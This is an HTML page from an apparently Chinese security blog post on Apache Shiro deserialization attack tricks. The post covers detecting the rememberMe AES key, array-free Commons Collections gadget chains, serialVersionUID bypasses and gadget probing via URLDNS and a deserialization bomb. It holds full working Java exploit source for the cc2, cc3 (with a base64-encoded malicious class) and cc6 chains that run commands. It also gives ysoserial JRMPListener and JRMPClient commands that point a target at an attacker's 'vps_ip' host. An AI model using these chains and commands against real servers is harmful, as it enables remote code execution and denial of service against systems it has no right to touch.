@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>shiro的tricks - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "shiro\u7684tricks", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+          {title: "\u63a2\u6d4bShiro Key\u7684\u529e\u6cd5", url: "#shiro-key", children: [
+              {title: "key\u4e0d\u5bf9", url: "#key" },
+              {title: "key\u6b63\u786e", url: "#key_1" },
+              {title: "\u63a2\u6d4b\u57fa\u51c6", url: "#_2" },
+          ]},
+          {title: "Shiro CC\u94fe\u76f8\u5173\u95ee\u9898", url: "#shiro-cc", children: [
+              {title: "\u65e0\u6570\u7ec4\u6539\u9020", url: "#_3" },
+              {title: "JRMP\u4fe1\u9053", url: "#jrmp" },
+          ]},
+          {title: "Serialize UID\u4e0d\u4e00\u81f4\u7ed5\u8fc7", url: "#serialize-uid", children: [
+          ]},
+          {title: "\u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u63a2\u6d4b\u5b58\u5728\u7684Gadget", url: "#gadget", children: [
+              {title: "URLDNS", url: "#urldns" },
+              {title: "\u53cd\u5e8f\u5217\u5316\u70b8\u5f39", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../../PHP/PHP/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../../PHP/PHP/" class="btn btn-xs btn-link">
+        PHP
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/" class="btn btn-xs btn-link">
+        shiro反序列化(shiro-550与shiro-721)
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="shirotricks">shiro的tricks</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#探测Shiro-Key的办法">探测Shiro Key的办法</a><ul>
+<li><a href="#key不对">key不对</a></li>
+<li><a href="#key正确">key正确</a></li>
+<li><a href="#探测基准">探测基准</a></li>
+</ul>
+</li>
+<li><a href="#Shiro-CC链相关问题">Shiro CC链相关问题</a><ul>
+<li><a href="#无数组改造">无数组改造</a></li>
+<li><a href="#JRMP信道">JRMP信道</a></li>
+</ul>
+</li>
+<li><a href="#Serialize-UID不一致绕过">Serialize UID不一致绕过</a></li>
+<li><a href="#有反序列化点探测存在的Gadget">有反序列化点，探测存在的Gadget</a><ul>
+<li><a href="#URLDNS">URLDNS</a></li>
+<li><a href="#反序列化炸弹">反序列化炸弹</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="shiro-key">探测Shiro Key的办法</h1>
+<p>在Shiro 反序列化rememberMe字段时，会经过这个方法。<strong>AbstractRememberMeManager#getRememberedPrincipals</strong></p>
+<p><img alt="" src="../image/image_br9v95sjJJ.png" /></p>
+<p>正常的反序列化攻击途径是先从getRememberedSerializedIdentity方法中获取rememberMe的值，然后进行CBC填充，然后进行Base64解密
+然后交给后面的convertBytesToPrincipals进行aes解密并将结果反序列化。</p>
+<h2 id="key">key不对</h2>
+<p>当反序列化时，rememberMe的key不对，会导致aes解密失败，产生报错被下面的catch块接收到抛出异常，我们看看catch块里面的onRememberedPrincipalFailure函数是什么</p>
+<p>逐步跟进</p>
+<p><img alt="" src="../image/image_AG2bX8Uwhb.png" /></p>
+<p>跟进后发现forgetIdentity 获取了request、response对象并交给另一个重构方法处理</p>
+<p><img alt="" src="../image/image_2LOjfJXhEj.png" /></p>
+<p>跟进后再跟进removeFrom</p>
+<p><img alt="" src="../image/image_dLxM3nalZL.png" /></p>
+<p>发现在返回头里加了cookie：rememberMe=deleteMe</p>
+<p><img alt="" src="../image/image_g_UotmUxI8.png" /></p>
+<h2 id="key_1">key正确</h2>
+<p>key正确，在一般的利用情况下依旧会被<strong>AbstractRememberMeManager#getRememberedPrincipals</strong> 接受异常并抛出，究其原因，是在反序列化时代码中使用了强制类型转换，而我们攻击时序列化的类是无法转换为 PrincipalCoolection。</p>
+<p><img alt="image-20210309214941029" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210309214941029.png" title="image-20210309214941029" /></p>
+<p>但是如果我们序列化的类是PrincipalCollection的可反序列化子类，那么当key正确时响应头将不会有Set-Cookie: rememberMe=deleteMe，key不正确时则会有，便可以以此为基准检测key是否正确。</p>
+<h2 id="_2">探测基准</h2>
+<p>那么总结一下上面的两种情况，要想达到只依赖shiro自身进行key检测，只需要满足两点：</p>
+<p>1.构造一个继承 <strong>PrincipalCollection</strong> 的序列化对象。</p>
+<p>2.key正确情况下不返回 <strong>deleteMe</strong> ，key错误情况下返回 <strong>deleteMe</strong> 。</p>
+<p>那么现在就存在类SimplePrincipalCollection，其继承自PrincipalCollection且可被反序列化，那么我们就可以用这个类来探测key了。</p>
+<p><img alt="" src="../image/image_7Z3i4dByHO.png" /></p>
+<p><img alt="" src="../image/image_qkJT0vkwKk.png" /></p>
+<h1 id="shiro-cc">Shiro CC链相关问题</h1>
+<p>shiro中反序列化重写了resolveClass，不能处理数组，所以一些cc链在shiro中用就会有问题。</p>
+<h2 id="_3">无数组改造</h2>
+<p>能改造成无数组形式的CC链只有 cc2、cc3、cc6</p>
+<p>cc2</p>
+<pre><code class="language-纯文本">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class Main {
+
+    public static void main(String[] args) throws Exception{
+
+        Constructor constructor = Class.forName(&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;).getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(&quot;newTransformer&quot;);
+
+        TransformingComparator Tcomparator = new TransformingComparator(transformer);
+        PriorityQueue queue = new PriorityQueue(1);
+
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;;
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
+        cc.setName(randomClassName);
+        //cc.writeFile();
+        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        byte[] classBytes = cc.toBytecode();
+        byte[][] targetByteCodes = new byte[][]{classBytes};
+
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes);
+        setFieldValue(templates, &quot;_name&quot;, &quot;blckder02&quot;);
+        setFieldValue(templates, &quot;_class&quot;, null);
+
+        Object[] queue_array = new Object[]{templates,1};
+        Field queue_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;queue&quot;);
+        queue_field.setAccessible(true);
+        queue_field.set(queue,queue_array);
+
+        Field size = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;size&quot;);
+        size.setAccessible(true);
+        size.set(queue,2);
+
+
+        Field comparator_field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        comparator_field.setAccessible(true);
+        comparator_field.set(queue,Tcomparator);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc2.bin&quot;));
+            outputStream.writeObject(queue);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc2.bin&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
+    }
+
+    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) {
+        Field field = null;
+        try {
+            field = clazz.getDeclaredField(fieldName);
+            field.setAccessible(true);
+        }
+        catch (NoSuchFieldException ex) {
+            if (clazz.getSuperclass() != null)
+                field = getField(clazz.getSuperclass(), fieldName);
+        }
+        return field;
+    }
+}
+</code></pre>
+<p>cc3</p>
+<pre><code class="language-纯文本">package com.shiroTest;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.Templates;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 {
+    public byte[] getPayload2() throws Exception{
+
+        byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTGNvbS9UZW1wbGFzdGVzSW1wbFRlc3QvY29kZVRlc3Q7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAA1jb2RlVGVzdC5qYXZhDAAZABoHACcMACgAKQEABGNhbGMMACoAKwEAH2NvbS9UZW1wbGFzdGVzSW1wbFRlc3QvY29kZVRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABEACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABYACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAAGAAEABkADQAaAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=&quot;);
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{bytes});
+        setFieldValue(templates,&quot;_name&quot;,&quot;dwa&quot;);
+        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());
+
+        Transformer transformers = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, new ConstantTransformer(1));
+        //第一个参数的map
+        // get方法中调用的是map.get
+        // 目的是调用lazyMap中的get方法 所以第一个参数是lazyMap
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;));
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+        //hashMap的readObject时会调用hash方法
+        // 然后key.hashCode() 会调用key的hashCode方法  key的值为tiedMapEntry
+        //调用tiedMapEntry的hashCode然后待用getValue方法 然后调用get方法
+        map2.put(tiedMapEntry, &quot;sss&quot;);
+        lazymap.remove(Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;));
+        Class c = LazyMap.class;
+        Field factoryField = c.getDeclaredField(&quot;factory&quot;);
+        factoryField.setAccessible(true);
+        factoryField.set(lazymap,transformers);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
+        objectOutputStream.writeObject(map2);
+        objectOutputStream.close();
+        return barr.toByteArray();
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj,value);
+    }
+}
+</code></pre>
+<p>cc6</p>
+<pre><code class="language-纯文本">package org.payload.cc.CC6;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import org.Tools.ClassTools;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+import java.io.ByteArrayInputStream;
+import java.io.ObjectInputStream;
+import java.util.*;
+
+import static org.Tools.ClassTools.setFieldValue;
+
+public class CommonsCollections6TemplatesImpl {
+    public Map CommonsCollections6TemplatesImpl(String args) throws Exception {
+        ClassTools ct = new ClassTools();
+        byte[] evilClass = ct.MakeEvilClass(&quot;org.Tools.evilclass.EvilClass&quot;);
+        //byte[] evilClass = evilClass2(&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;+args+&quot;\&quot;);&quot;);
+        TemplatesImpl tmp = ct.template(evilClass);
+        InvokerTransformer transformer = new InvokerTransformer(&quot;toString&quot;, null, null);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformer);
+        TiedMapEntry tme = new TiedMapEntry(outerMap, tmp);
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;valuevalue&quot;);
+        outerMap.clear();
+        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
+        return expMap;
+    }
+    public static byte[] CommonsCollections6TemplatesImplPayload(String args) throws Exception {
+        ClassTools ct = new ClassTools();
+        CommonsCollections6TemplatesImpl commonsCollections6Templates = new CommonsCollections6TemplatesImpl();
+        Object evil = commonsCollections6Templates.CommonsCollections6TemplatesImpl(args);
+        return ct.serial(evil);
+    }
+    public static  void main(String[] args) throws Exception {
+        byte[] evilByteClass = CommonsCollections6TemplatesImplPayload(&quot;calc.exe&quot;);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(evilByteClass));
+        ois.readObject();
+    }
+}
+</code></pre>
+<h2 id="jrmp">JRMP信道</h2>
+<p>当然，如果JRMP联通了，直接走JRMP通道拿啥都可以打了</p>
+<p>vps上执行以下命令，监听端口</p>
+<pre><code class="language-纯文本">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 'calc'
+</code></pre>
+<p>我们再通过ysoserial生成payload</p>
+<pre><code class="language-纯文本">java -jar ysoserial-master-SNAPSHOT.jar JRMPClient 'vps_ip:12006'|base64|sed ':label;N;s/\n//;b label'
+</code></pre>
+<p>然后伪造cookie，发过去，成功弹计算器</p>
+<p><img alt="image-20210310194746492" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310194746492.png" title="image-20210310194746492" /></p>
+<h1 id="serialize-uid">Serialize UID不一致绕过</h1>
+<p>在攻击时，如果构造的序列化对象SUID和目标上的对象SUID不一致，则无法完成反序列化抛出错误。
+核心检测代码如下</p>
+<pre><code class="language-纯文本">  // SUID检查条件：是否都或都没有实现了Serializable接口 &amp;&amp; 不是数组类 &amp;&amp; suid不相同
+        if (serializable == localDesc.serializable &amp;&amp;
+            !cl.isArray() &amp;&amp;
+            suid.longValue() != localDesc.getSerialVersionUID())
+        {
+            throw new InvalidClassException(localDesc.name,
+                &quot;local class incompatible: &quot; +
+                &quot;stream classdesc serialVersionUID = &quot; + suid +
+                &quot;, local class serialVersionUID = &quot; +
+                localDesc.getSerialVersionUID());
+        }
+</code></pre>
+<ol>
+<li>动态生成一个A类不实现Serializable接口进行序列化。如果线上的A类是实现Serializable接口，第一个条件就不成立了直接绕过。如果线上的Class没有实现改接口，则两者suid都为0L,第三个条件不符合，自然无需检查。</li>
+<li>直接序列化A[].class，第二个条件直接不符合，直接不用检查SUID，无需关心实现实现Serializable接口。</li>
+</ol>
+<h1 id="gadget">有反序列化点，探测存在的Gadget</h1>
+<p>ref：<a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==\&amp;mid=2247484178\&amp;idx=1\&amp;sn=228ccc3d624f2d64a6c1d51555c42eea\&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8\&amp;mpshare=1\&amp;scene=23\&amp;srcid=0223h9KLw3Bpv4B57cmWkp7z\&amp;sharer_sharetime=1645787561952\&amp;sharer_shareid=ff51a992c5bfd7616a29069bf0989669#rd" title="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==\&amp;mid=2247484178\&amp;idx=1\&amp;sn=228ccc3d624f2d64a6c1d51555c42eea\&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8\&amp;mpshare=1\&amp;scene=23\&amp;srcid=0223h9KLw3Bpv4B57cmWkp7z\&amp;sharer_sharetime=1645787561952\&amp;sharer_shareid=ff51a992c5bfd7616a29069bf0989669#rd">https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==\&amp;mid=2247484178\&amp;idx=1\&amp;sn=228ccc3d624f2d64a6c1d51555c42eea\&amp;chksm=cf36fb52f8417244ea608ea14da45b876548617864179c8da6df46010bed78aa41c4a2277cb8\&amp;mpshare=1\&amp;scene=23\&amp;srcid=0223h9KLw3Bpv4B57cmWkp7z\&amp;sharer_sharetime=1645787561952\&amp;sharer_shareid=ff51a992c5bfd7616a29069bf0989669#rd</a></p>
+<h2 id="urldns">URLDNS</h2>
+<p>URLDNS链有如下代码</p>
+<pre><code class="language-纯文本">// java.util.HashMap#readObject
+private void readObject(java.io.ObjectInputStream s)
+         throws IOException, ClassNotFoundException
+    {
+    ......
+            // Read the keys and values, and put the mappings in the HashMap
+            for (int i = 0; i &lt; mappings; i++) {
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    K key = (K) s.readObject();
+                @SuppressWarnings(&quot;unchecked&quot;)
+                    V value = (V) s.readObject();
+                putVal(hash(key), key, value, false, false);
+            }
+    }
+}
+</code></pre>
+<p>当解析HashMap时，正常情况下会解析key中的对象，如果key时URL对象则会对其指定的DNS地址进行一次解。
+但是若HashMap里key对应的value的对象不存在，就无法被反序列化，则会抛出错误，导致后面的DNS解析失败。</p>
+<p>所以就可以以此为基准探测目标环境是否存在某个Class来推测目标环境是否存在某Gadget：若Gadget存在则会产生DNS解析，反之则不会产生DNS解析。</p>
+<h2 id="_4">反序列化炸弹</h2>
+<p><strong>通过构造特殊的多层嵌套HashSet，导致服务器反序列化的时间复杂度提升，消耗服务器所有性能，导致拒绝服务。在这个基础上，我选择消耗部分性能达到间接延时的作用，来探测class。</strong></p>
+<p><img alt="" src="../image/image_89EhQGxnOk.png" /></p>
+<p>由于每个服务器的性能不一样，要想让它们延时时间相同，就需要调整反序列化炸弹的深度。所以在使用该gadget时，要先测试出深度，一般最好调整到比正常请求慢10秒以上。经过我的实战一般这个深度都在25到28之间，切记不要设置太大否则造成DOS。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../../../PHP/PHP/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../../../PHP/PHP/" class="btn btn-xs btn-link">
+        PHP
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/" class="btn btn-xs btn-link">
+        shiro反序列化(shiro-550与shiro-721)
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
